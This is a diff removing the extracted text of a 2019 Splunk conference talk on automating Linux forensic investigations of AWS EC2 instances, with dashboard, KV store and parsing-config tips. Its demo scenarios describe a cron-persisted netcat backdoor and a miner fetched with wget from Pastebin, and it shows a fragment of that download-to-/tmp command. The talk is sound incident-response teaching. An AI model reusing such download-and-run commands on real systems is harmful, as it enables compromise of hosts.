@@ -1,388 +1,0 @@
-Using Splunk in Automating Forensic Investigations in AWS
-
-© 2019 SPLUNK INC.
-
-David Rutstein
-Principal Incident Responder | GE Digital - Predix
-
-Alina Dejeu
-Sr. Incident Responder | GE Digital - Predix
-
-ForwardLooking Statements
-
-© 2019 SPLUNK INC.
-During the course of this presentation, we may make forward-looking statements regarding future events or plans of the company. We caution you that such statements reflect our current expectations and estimates based on factors currently known to us and that actual events or results may differ materially. The forward-looking statements made in the this presentation are being made as of the time and date of its live presentation. If reviewed after its live presentation, it may not contain current or accurate information.We do not assume any obligation to update any forward-looking statements made herein.
-In addition, any information aboutour roadmap outlines our general product direction and is subject to change at any time without notice. It is for informational purposes only, and shall not be incorporated into any contract or other commitment. Splunk undertakes no obligation either to develop the features or functionalities described or to include any such feature or functionality in a future release.
-Splunk, Splunk>, Turn Data Into Doing, The Engine for Machine Data, Splunk Cloud, Splunk Light and SPL are trademarks and registered trademarks of Splunk Inc. in the United States and other countries.All other brand names,productnames, or trademarks belong to their respective owners. © 2019 Splunk Inc. All rights reserved.
-
-© 2019 SPLUNK INC.
-The Story So Far...
-How did we get here?
-
-Forensics App Backstory
-How this app came to be
-Splunkbase already contains an abundance of content to analyze forensic evidence · Issues:
-­ Most are for windows based forensics evidence ­ Only work for specific outputs (i.e. Volatility files) ­ Contain a lot of custom Javascript / Python files
-
-© 2019 SPLUNK INC.
-
-Best Practices
-Building the Toolset
-· Memory
- Volatile data from the EC2 instance's virtual memory
-
-© 2019 SPLUNK INC.
-· Volatility, Margarita Shotgun, LiME, enCase
-
-· OS Artifacts
- Various commands run against the virtual hard drive and outputting the content to a file
-· Super Timelines
- Forensics timeline analysis
-
-· Sleuth Kit, GRR, Loki · Plaso/Log2Timeline
-
-Setup
-
-© 2019 SPLUNK INC.
-
-OS-Artifacts
-Default layout
-
-© 2019 SPLUNK INC.
-
-OS-Artifacts
-Build a lookup based on best practices
-
-© 2019 SPLUNK INC.
-
- Correlate the artifacts pulled from the host with forensics best practices and flag as appropriate.
-
-OS-Artifacts
-Trigger KV store search via a token
-
-© 2019 SPLUNK INC.
-When token run_kv_search is set remember to wait a minute or two because this search is writing all your forensics data to the KV store before you refresh the page.
-
- Left panel: contains a search that will look for our host within the KV store.
- If host not found, run_kv_search token is set.
- Right panel: hidden panel containing a search that runs only when the run_kv_search token is set.
-
-Demo
-
-© 2019 SPLUNK INC.
-
-SCENARIO #1
-PERSISTENT NETCAT BACKDOOR
-· Vulnerable Jenkins server exposed to internet · Remote exploit used to compromise instance · Cron used to persist netcat backdoor
-Alerted on suspicious IP
-
-© 2019 SPLUNK INC.
-
-© 2019 SPLUNK INC.
-
-© 2019 SPLUNK INC.
-
-© 2019 SPLUNK INC.
-
-SCENARIO #2
-CRYPTO MINER INSTALLED VIA WGET
-
-© 2019 SPLUNK INC.
-
-· Remote exploit trigger script download via wget from Pastebin · Script downloaded to /tmp which installed a bitcoin miner
-Alerted based on DNS request to known crypto mining domain
-
-© 2019 SPLUNK INC.
-1
-
-2
-
-3
-
-© 2019 SPLUNK INC.
-
-www.pastebin.com/93b we8w > /tmp/suspicious.doc
-
-© 2019 SPLUNK INC.
-
-© 2019 SPLUNK INC.
-
-How Did Splunk Help?
-How was the investigative process improved?
-
-1. Correlate multiple forensics data sources 2. Quickly identify malicious activity
-
-© 2019 SPLUNK INC.
-
-Looking Ahead
-Future ES Integrations
-
-1. More CIM normalization 2. Link to existing notables 3. Integration with threat intelligence
-
-© 2019 SPLUNK INC.
-Q&A
-David Rutstein | Incident Response Alina Dejeu | Incident Response
-
-© 2019 SPLUNK INC.
-Tips and Tricks
-
-OS-Artifacts Panels
-
-© 2019 SPLUNK INC.
-
-ERROR
-
- OS-Artifacts dashboard contains 7 panels:
-
- ERROR panel:
-· The ERROR panel is only displays when the HOST is not
-found in the KV store (see Host found in KV store panel)
-
-· ERROR
-
-· HOST found in KV
-store
-
-· KV store search
-
-· Input block format
-
-· Radio option output
-
-· 2 search specific
-panels
-
-· Ss ta
-
-· Ps aux
-
-OS-Artifacts Panels
-HOST found in KV store
- HOST found in KV store panel: · This panel is displayed when the selected host has been
-found in the KV store
-NOTE: We need a way to identify all of the collected forensic evidence is associated to the case at hand. Within AWS since every ec2 instance has an instance ID we have set the HOST for every forensic data that has been sent to Splunk to the ec2 instance ID of the target we are investigating.
-
-© 2019 SPLUNK INC.
-
-OS-Artifacts Panels
-
-© 2019 SPLUNK INC.
-
-KV store search
- KV store search panel:
-
-· This is a hidden panel that contains a run_kv_search token. When the token is set a search is
-triggered that will re-write data to the KV store.
-
-Table the fields that appears in EVERY os-artifact. This way you can search against the KV store to show you every sourcetype that contains x artifact.
-· Outputlookup overwrites data it doesn't really append anything. You could technically do |
-inputlookup ... | dedup [field] | outputlookup .... HOWEVER, that will not work in our case. Not every forensic data file collected contain the same fields. The only fields that appear in EVERY forensic data file collected is sourcetype, source, and host and we can't dedup on those. Therefore, to be safe we simply rewrite all of our forensic data to the KV store every time this search is run.
-
-OS-Artifacts Panels
-Input block format
-
- Block format:
-
-1) input setting
-
-· Set input type to radio and add an id
-
-· Add the html css style to a hidden panel
-
-© 2019 SPLUNK INC.
-2) css style
-
-OS-Artifacts Panels
-Increase panel font
-
-Default size
-
-Size 20px
-
- Panel font side:
-· Add an id to panel and add html css (must be different
-id per panel)
-
-© 2019 SPLUNK INC.
-css style
-
-OS-Artifacts Panels
-Radio option output
- Radio option output panel:
-· This panel displays the search results of
-the radio input option selected.
-· See next 3 slides for details
-
-© 2019 SPLUNK INC.
-
-© 2019 SPLUNK INC.
-
-Minimize Amount of Panels
-
-Instead of setting each radio option to a token and having a separate panel for each token
-
-use <choice value="...[mysearch]...">
-
-Replace quote
-
-with &quot;
-
-Here we only have 3 radio options imagine if we had 20
-We would have to have 20 different panels as well
-
-Instead include your search right in the value. The value of token $os-artifacts$ will be the search of the specific radio option you click on.
-NOTE: when you use <choice value="...[my search]..."> quotation marks within the search must be replaced with &quot;
-
-Minimize Amount of Panels
-Not always possible to place search within <choice value="...[mysearch]...">
-
-© 2019 SPLUNK INC.
-
- You can't place a token within the <choice value="...">, if you do you will get the following error when you try to select that radio option:
- See next slide for a work around
-
-NOTE:  Replace > with &gt; within xml  Replace < with &lt; within xml
-
-Minimize Amount of Panels
-Not always possible to place search within <choice value="...[mysearch]..."> cont.
-
-© 2019 SPLUNK INC.
-
-Why we can't put ss ta within the <choice value= Since we are doing a | inputlookup we can't do:
-$host_tok$ | inputlookup...
-
-"Sa ta" and "Ps aux" both require a token within the search
-
-And we can't put the $host_tok$ at the end because the end of the search contains
-| fields ­ host
-Therefore $host_tok$ must go inside the search
-
- When "Ss ta" is selected we set the ss_ta token and unset the main_panel and ps_aux tokens.
- The main_panel token is for ALL of the rest of the radio options where we don't have to include a token within our search
-
-© 2019 SPLUNK INC.
-Add Optional Text Search
-Radio option output
- Scenario: one of the forensic data files you collect is a file containing a massive list of every file that was modified within the last 24 hours. You notice a potentially suspicious directory (i.e. /badfolder) existing in the /tmp directory. You want to search for the keyword badfolder to see what might have been modified containing that keyword.
-
-Search Syntax
-Files modified 1 day
-
-© 2019 SPLUNK INC.
- Scenario: one of the forensic data files we collect is a file containing a massive list of every file that was modified within the last 24 hours. We want splunk to flag when the file_path matches a value within our csv lookup AND search the KV store to see if the file_name is found in any other sourcetype.
- Results: splunk found several files that where modified within the last 24 hours AND within the past 7 days
-
-Search Syntax
-Ls tmp
-
-© 2019 SPLUNK INC.
- Scenario: one of the forensic data files we collect is an Ls of the tmp directory. With this file we can see the permission and user of each file. We want splunk to search the KV store to see if the file_name is found in any other sourcetype.
- Results: splunk found 2 files in multiple locations. The file_name malware.sh was found in 3 separate directories within the files-modified-7-days sourcetype.
-
-Search Syntax
-Ss ta (aka: netstat)
-
-© 2019 SPLUNK INC.
- Scenario: Here we have a netstat output. On the next slide we have ps aux. We want splunk when state is set to listen and local_port is greater 1024 to flag that event AND search the command field (which is a field within ps aux) to see if there is a match.
- Results: port 6666 is found in ps-aux sourcetype
-
-Search Syntax
-
-© 2019 SPLUNK INC.
-
-Ps aux
- Scenario: Here we have a ps aux output. We want splunk to do a rex of the command field in order to see if there is anything that resembles a port number greater then 1024. The command field can contain actual commands a user typed into the command line of the ec2 instance we are investigating. If a potential port number is found we then want splunk to search against the local_port field within the KV store to see if there is a match.
-
- Results: port 6666 is found in ss-ta sourcetype
-
-© 2019 SPLUNK INC.
-Parsing Config
-Parse file that contain multi-line key value pair into 1 event
- Scenario: You have a file that contains several lines of key value pairs that you want to ingest into splunk in 1 event. You can do this with EXTRACT.
-
-sample_file.txt
-Static hostname: ip-10-153-24-53 Machine ID: 9rje38rh3582ydhr4849dhw39 Boot ID: e38db899ey39ww0hw89w4h
-Operating System: Ubuntu 16.04.5 LTS
-Once the data is ingested into splunk all 4 lines will be in 1 event and parsed (field/value)
-
-props.conf
-[sample_file] DATETIME_CONFIG = CURRENT
-
-Set regex to where you want to event to break or set the regex to something that will never be found if the entire file is 1 event.
-
-SHOULD_LINEMERGE = false
-
-LINE_BREAKER = (completefile*)
-
-EVENT_BREAKER = (completefile*)
-
-EVENT_BREAKER_ENABLE = true
-
-EXTRACT-static_host = (?m)^\s+Static\shostname\:\s(?<static_hostname>.+?$
-
-EXTRACT-machine_id = (?m)\s+Machine\sID\:\s(?<machine_id>.+?)$
-
-EXTRACT-boot_id = (?m)^\s+Boot\sID\:\s(?<boot_id>.+?)$
-
-EXTRACT-operating_system = (?m)^\sOperating\sSystem\:\s(?<os>.+?)$
-
-(?m) is how you tell splunk this is a multi-line event
-
-Parsing Config
-
-© 2019 SPLUNK INC.
-
-File contains extra text at the top of the file you don't want ingested
- Scenario: You have a file that contains some text at the top of the file before your data begins that you don't care about and you don't want this text to get ingested into splunk. Use the PREAMBLE_REGEX.
-
- NOTE: When your using a UF to send data to splunk you normally just have the inputs.conf on the UF but when you use the PREAMBLE_REGEX you need to include a copy of the props.conf as well. That is because the UF will not send the data that matches the regex you provide in the PREAMBLE_REGEX.
-
-sample_file.txt
------------------------ extra text here -----------------------Static hostname: ip-10-153-24-53 Machine ID: 9rje38rh3582ydhr4849dhw39 Boot ID: e38db899ey39ww0hw89w4h
-Operating System: Ubuntu 16.04.5 LTS
-
-props.conf
-[sample_file] PREAMBLE_REGEX = ^---.*---$
-Regex matches the first line of our sample_file.txt and will not send this 1 line. The UF will just send the rest of the file content to splunk.
-
-© 2019 SPLUNK INC.
-Parsing Config
-File contains extra text within the file you don't want ingested cont.
- Scenario: You have a file that contains some text you don't care about and you don't want this text to get ingested into splunk. You can use transform.conf to remove that data.
-
-sample_file.txt
-Static hostname: ip-10-153-24-53 Machine ID: 9rje38rh3582ydhr4849dhw39
------------------------ extra text here -----------------------Boot ID: e38db899ey39ww0hw89w4h
-Operating System: Ubuntu 16.04.5 LTS
-Here our extra text is within our data.
-
-props.conf
-[sample_file] TRANSFORMS-remove = remove_extra_text
-transforms.conf
-[remove_extra_text] REGEX = ^---.*---$ DEST_KEY = queue FORMAT = nullQueue
-
-© 2019 SPLUNK INC.
-Timeline Lookup
-Apply a csv lookup for timeline data ­> Linux specific
- Apply a csv lookup to help highlight potentially suspicious activity that is found within a timeline. The example below is Linux specific. Rules for a windows based system would be different.
-We assigned each rule an arbitrary risk score
-
-Timeline Lookup cont.
-Apply a csv lookup for timeline data ­> Linux specific
- See next slide for example of the search syntax.
-
-© 2019 SPLUNK INC.
-
-Timeline Lookup cont.
-Timeline search syntax
-Timeline_name token. Each timeline has a parsed field that identified the timeline_name.
-
-© 2019 SPLUNK INC.
-Dashboard contain text input type ­ this is to provide boolean search on the timeline
-
-© 2019 SPLUNK INC.
-Thank You!
-Go to the .conf19 mobile app to
-RATE THIS SESSION
-
-
